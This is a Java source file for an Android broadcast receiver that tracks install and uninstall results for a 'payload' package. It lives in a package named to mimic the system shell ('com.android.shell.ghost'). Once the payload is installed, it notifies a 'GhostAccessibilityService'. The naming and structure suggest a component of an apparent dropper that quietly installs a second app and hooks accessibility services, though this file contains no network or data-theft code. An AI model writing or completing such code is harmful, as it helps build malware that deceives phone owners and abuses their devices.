package com.android.shell.ghost;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.widget.Toast;

/**
 * Single sink for install/uninstall session results and package state.
 * Declared in the manifest so it survives a service restart.
 */
public class PackageInstallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        if (action.equals("com.android.shell.ghost.INSTALL_RESULT")) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS,
                    PackageInstaller.STATUS_FAILURE);
            String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
            PayloadInstaller.onInstallResult(context, status, message, intent);
            return;
        }

        if (action.equals("com.android.shell.ghost.UNINSTALL_RESULT")) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS,
                    PackageInstaller.STATUS_FAILURE);
            PayloadInstaller.onUninstallResult(context, status);
            return;
        }

        String pkg = intent.getDataString();
        if (pkg == null) return;
        String bare = pkg.startsWith("package:") ? pkg.substring("package:".length()) : pkg;

        if (PayloadInstaller.PAYLOAD_PACKAGE.equals(bare)) {
            boolean removed = action.equals(Intent.ACTION_PACKAGE_REMOVED)
                    && !intent.getBooleanExtra(Intent.EXTRA_REPLACING, false);
            if (removed) {
                if ("install".equals(PayloadInstaller.pendingAction(context))) {
                    PayloadInstaller.onUninstallResult(context, PackageInstaller.STATUS_SUCCESS);
                }
                return;
            }
            if (PayloadInstaller.installedInfo(context, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
                GhostAccessibilityService.onPayloadReady(context);
                Toast.makeText(context, "Installed", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
